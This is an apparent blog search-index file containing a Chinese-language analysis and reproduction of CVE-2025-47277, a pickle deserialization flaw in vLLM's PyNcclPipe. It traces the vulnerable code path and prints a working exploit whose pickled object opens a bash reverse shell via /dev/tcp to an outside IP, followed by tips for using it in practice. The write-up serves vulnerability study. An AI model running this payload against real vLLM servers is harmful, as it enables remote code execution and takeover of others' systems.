<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vLLM PyNcclPipe pickle反序列化漏洞(CVE-2025-47277) 分析以及复现</title>
    <link href="/2025/08/12/vLLM%20PyNcclPipe%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2025-47277)%20%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/08/12/vLLM%20PyNcclPipe%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2025-47277)%20%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="vLLM-PyNcclPipe-pickle反序列化漏洞-CVE-2025-47277-分析以及复现"><a href="#vLLM-PyNcclPipe-pickle反序列化漏洞-CVE-2025-47277-分析以及复现" class="headerlink" title="vLLM PyNcclPipe pickle反序列化漏洞(CVE-2025-47277) 分析以及复现"></a>vLLM PyNcclPipe pickle反序列化漏洞(CVE-2025-47277) 分析以及复现</h3><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>一个影响了V0引擎与PyNcclPipe模块的反序列化漏洞。主要成因是未验证的去反序列化来自于网络的数据，攻击者通过构造恶意的序列化数据并进行传递，即可在服务端被反序列化恶意数据，导致任意代码的执行。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>vLLM &gt;&#x3D; 0.6.5 并且 &lt;0.8.5</li><li>使用V0引擎</li><li>PyNcclPipe KV cache 传输集成</li><li>具体的pr可见security部分</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>pip install torch&#x3D;&#x3D;2.1.2 –index-url <a href="https://download.pytorch.org/whl/cpu">https://download.pytorch.org/whl/cpu</a> </li><li>pip install vllm&#x3D;&#x3D;0.7.3</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="千算万算不如不算"><a href="#千算万算不如不算" class="headerlink" title="千算万算不如不算"></a>千算万算不如不算</h3><p>首先git clone <a href="https://github.com/vllm-project/vllm.git%EF%BC%88%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%89">https://github.com/vllm-project/vllm.git（存在漏洞的版本）</a></p><p>或者使用 git checkout v0.7.3</p><p><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-hjq4-87xh-g4fv">https://github.com/vllm-project/vllm/security/advisories/GHSA-hjq4-87xh-g4fv</a></p><p>这篇github的security文章中给出了exp以及触发漏洞的调用堆栈信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vllm<span class="hljs-selector-class">.distributed</span><span class="hljs-selector-class">.kv_transfer</span><span class="hljs-selector-class">.kv_pipe</span><span class="hljs-selector-class">.pynccl_pipe</span><span class="hljs-selector-class">.PyNcclPipe</span>._recv_impl<br>-&gt; vllm<span class="hljs-selector-class">.distributed</span><span class="hljs-selector-class">.kv_transfer</span><span class="hljs-selector-class">.kv_pipe</span><span class="hljs-selector-class">.pynccl_pipe</span><span class="hljs-selector-class">.PyNcclPipe</span>._recv_metadata<br>-&gt; vllm<span class="hljs-selector-class">.distributed</span><span class="hljs-selector-class">.utils</span><span class="hljs-selector-class">.StatelessProcessGroup</span><span class="hljs-selector-class">.recv_obj</span><br>-&gt; pickle<span class="hljs-selector-class">.loads</span> <br></code></pre></td></tr></table></figure><p>根据堆栈信息我们可以直接找到漏洞的入口位置</p><ul><li>vllm&#x2F;distributed&#x2F;kv_transfer&#x2F;kv_pipe&#x2F;pynccl_pipe.py</li></ul><p>跟踪到第一个位置，再往下是PyNcclPipe这个类的定义 以及 _recv_impl这个方法的触发</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe import PyNcclPipe<br><span class="hljs-keyword">from</span> vllm.config import KVTransferConfig<br><br><span class="hljs-attribute">config</span>=KVTransferConfig(<br>    <span class="hljs-attribute">kv_ip</span>=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<br>    <span class="hljs-attribute">kv_port</span>=18888,<br>    <span class="hljs-attribute">kv_rank</span>=0,<br>    <span class="hljs-attribute">kv_parallel_size</span>=1,<br>    <span class="hljs-attribute">kv_buffer_size</span>=1024,<br>    <span class="hljs-attribute">kv_buffer_device</span>=<span class="hljs-string">&quot;cpu&quot;</span><br>)<br><br><span class="hljs-attribute">p</span>=PyNcclPipe(config=config,local_rank=0)<br>p.recv_tensor() # Receive data<br></code></pre></td></tr></table></figure><p>这里先看简化过的server.py</p><p>可以看到p&#x3D;PyNcclPipe(config&#x3D;config,local_rank&#x3D;0) 这一行实际上是 新建了一个PyNcclPipe对象，并且传入了参数。</p><p>先观察一下该对象的构造函数都做了什么事情</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lua"><br>def __init__():<br>    <span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span> = <span class="hljs-built_in">config</span><br>    <span class="hljs-built_in">self</span>.local_rank = local_rank<br>    <span class="hljs-built_in">self</span>.kv_rank = <span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span>.kv_rank<br>    <span class="hljs-built_in">self</span>.kv_parallel_size = <span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span>.kv_parallel_size<br>    <br>    <span class="hljs-built_in">self</span>.group = StatelessProcessGroup.<span class="hljs-built_in">create</span>(<br>        host=<span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span>.kv_ip,<br>        port=<span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span>.kv_port + port_offset,<br>        rank=<span class="hljs-built_in">self</span>.kv_rank,<br>        world_size=<span class="hljs-built_in">self</span>.kv_parallel_size,<br>    )<br></code></pre></td></tr></table></figure><p>上面是简化版本的构造函数，其中创建了一个StatelessProcessGroup类的示例 并且赋值给了self.group</p><p>跟入create方法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">store = TCPStore(<br>    <span class="hljs-attribute">host_name</span>=host,<br>    <span class="hljs-attribute">port</span>=port,<br>    <span class="hljs-attribute">world_size</span>=world_size,<br>    is_master=(rank == 0),<br>)<br></code></pre></td></tr></table></figure><p>这里是一个TCPStore实例的声明</p><p>可以看到host和port都是由传参进行的赋值</p><p>回溯过去看也就是 kv_ip和kv_port的传值</p><p>kv_ip&#x3D;”0.0.0.0”,<br>kv_port&#x3D;18888,</p><p>那么应该是如上所述才对，也就是说host是可控的，不应该会发生未授权的情况，顶多就是配置不当才会导致漏洞被触发。</p><p>但是实际上 把这个0.0.0.0改为其他的host值，例如127.0.0.1（本地），漏洞也同样存在。</p><p>这里我们可以在本地起一个demo来验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch.distributed <span class="hljs-keyword">import</span> TCPStore<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><br><br><span class="hljs-comment"># 假设当前机器端口 18888 空闲</span><br>store = TCPStore(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">18888</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">True</span>, timedelta(seconds=<span class="hljs-number">30</span>))<br><br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;TCPStore 已启动，按回车退出...&quot;</span>)<br></code></pre></td></tr></table></figure><p>pip show torch来安装库</p><p>netstat -anv | grep 18888 查看一下监听的范围</p><p><img src="/../image/%E6%B5%8B%E8%AF%95/image-20250815204712285.png" alt="image-20250815204712285"></p><p>这里就可以明显看到 监听的是所有的ip （*.18888）</p><p>原因所在是虽然传参以及代码中都很完美的去指定了host的值，但是这个底层基于TCPStore实现</p><p>而TCPStore是基于c++而来的（<a href="https://github.com/pytorch/pytorch/blob/main/torch/csrc/distributed/c10d/TCPStore.cpp%EF%BC%89">https://github.com/pytorch/pytorch/blob/main/torch/csrc/distributed/c10d/TCPStore.cpp）</a></p><p>在它的代码中，并未显式设置ip的值，仅能设置port的值</p><p>create_libuv_tcpstore_backend(opts)&#x2F;create_tcpstore_backend(opts);</p><p>都只有port的定义，并未涉及ip，所以ip的指定遵循底层的默认设计，也就是0.0.0.0</p><p>因此在网络层面上产生了针对于任意ip的未授权访问、数据传输</p><h3 id="老生常谈之反序列化"><a href="#老生常谈之反序列化" class="headerlink" title="老生常谈之反序列化"></a>老生常谈之反序列化</h3><p>清楚了未授权的由来，接下来只需要找到一个反序列化点即可</p><p>接着看server.py的最后一行</p><p>recv_tensor()</p><p>跟入该函数，查看定义</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">future</span> = <span class="hljs-keyword">self</span>.transport_thread.submit(<span class="hljs-keyword">self</span>._recv_impl)<br></code></pre></td></tr></table></figure><p>可以看到这里调用了 _recv_impl，继续跟入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">metadata</span> <span class="hljs-operator">=</span> self._recv_metadata()<br></code></pre></td></tr></table></figure><p>其中会执行这一行代码，继续跟入_recv_metadata()</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>.<span class="hljs-keyword">group</span>.recv_obj(<span class="hljs-built_in">self</span>.target_rank_for_recv)<br></code></pre></td></tr></table></figure><p>发现这里有recv_obj()，继续跟入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recv_obj</span>(<span class="hljs-params">self, src: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Any</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Receive an object from a source rank.&quot;&quot;&quot;</span><br>    obj = pickle.loads(<br>        <span class="hljs-variable language_">self</span>.store.get(<br>            <span class="hljs-string">f&quot;send_to/<span class="hljs-subst">&#123;self.rank&#125;</span>/<span class="hljs-subst">&#123;self.recv_src_counter[src]&#125;</span>&quot;</span>))<br>    <span class="hljs-variable language_">self</span>.recv_src_counter[src] += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure><p>这里跟到了pickle.loads()，很明显是一个反序列化的点位</p><p>pickle.loads(self.store.get(f”send_to&#x2F;{self.rank}&#x2F;{self.recv_src_counter[src]}”))</p><p>单独取出来，查看反序列化数据来源</p><p>而这个self.store是一个键值对的形式</p><p>其中get方法就是通过传入键取出值，键即为(f”send_to&#x2F;{self.rank}&#x2F;{self.recv_src_counter[src]}”)</p><p>只需要传入对应的键值对即可触发反序列化漏洞</p><p>这里贴一下exp的代码来分析</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> vllm.distributed.utils import StatelessProcessGroup<br><br>class Evil:<br>    def __reduce__(self):<br>        import os<br>        <span class="hljs-attribute">cmd</span>=<span class="hljs-string">&#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.28.176.1/8888 0&gt;&amp;1&quot;&#x27;</span><br>        return (os.system,(cmd,))<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">client </span>= StatelessProcessGroup.create(<br>    <span class="hljs-attribute">host</span>=<span class="hljs-string">&#x27;172.17.0.1&#x27;</span>,<br>    <span class="hljs-attribute">port</span>=18888,<br>    <span class="hljs-attribute">rank</span>=1,<br>    <span class="hljs-attribute">world_size</span>=2,<br>)<br><br>client.send_obj(<span class="hljs-attribute">obj</span>=Evil(),dst=0)<br></code></pre></td></tr></table></figure><p>我们这里跟入send_obj这个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_obj</span>(<span class="hljs-params">self, obj: <span class="hljs-type">Any</span>, dst: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Send an object to a destination rank.&quot;&quot;&quot;</span><br>    <span class="hljs-variable language_">self</span>.expire_data()<br>    key = <span class="hljs-string">f&quot;send_to/<span class="hljs-subst">&#123;dst&#125;</span>/<span class="hljs-subst">&#123;self.send_dst_counter[dst]&#125;</span>&quot;</span><br>    <span class="hljs-variable language_">self</span>.store.<span class="hljs-built_in">set</span>(key, pickle.dumps(obj))<br>    <span class="hljs-variable language_">self</span>.send_dst_counter[dst] += <span class="hljs-number">1</span><br>    <span class="hljs-variable language_">self</span>.entries.append((key, time.time()))<br></code></pre></td></tr></table></figure><p>传参一个obj，一个dst，这里obj即为exp里的对象</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">key</span> <span class="hljs-operator">=</span> f<span class="hljs-string">&quot;send_to/&#123;dst&#125;/&#123;self.send_dst_counter[dst]&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>key的赋值 “send_to&#x2F;0&#x2F;0”</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">self<span class="hljs-selector-class">.store</span><span class="hljs-selector-class">.set</span>(key, pickle<span class="hljs-selector-class">.dumps</span>(obj))<br></code></pre></td></tr></table></figure><p>恶意对象的反序列化以及键值对的写入</p><p>最终传输到服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;send_to/<span class="hljs-subst">&#123;self.rank&#125;</span>/<span class="hljs-subst">&#123;self.recv_src_counter[src]&#125;</span>&quot;</span>))<br></code></pre></td></tr></table></figure><p>值被读出，并且被反序列化</p><p>恶意代码执行</p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>这里实战的注意点其实还有一个键值对的传递（发送与接收）</p><p>为什么一定能接到？</p><p>因为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">self<span class="hljs-selector-class">.send_dst_counter</span> = &#123;<span class="hljs-selector-tag">i</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.world_size)&#125;<br>self<span class="hljs-selector-class">.recv_src_counter</span> = &#123;<span class="hljs-selector-tag">i</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.world_size)&#125;<br></code></pre></td></tr></table></figure><p>这两个字典推导式可以看出，初始值为{0,0}，只要遍历完了，就肯定能接到反序列化数据。</p><p>当然演示的时候这个server和poc 肯定得是0,0 因为这是我们演示所用的，并没有正常的业务去抢占。</p><p>如果恰好失败，也可以使用爆破的方式去实现反序列化，毕竟数量很小。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
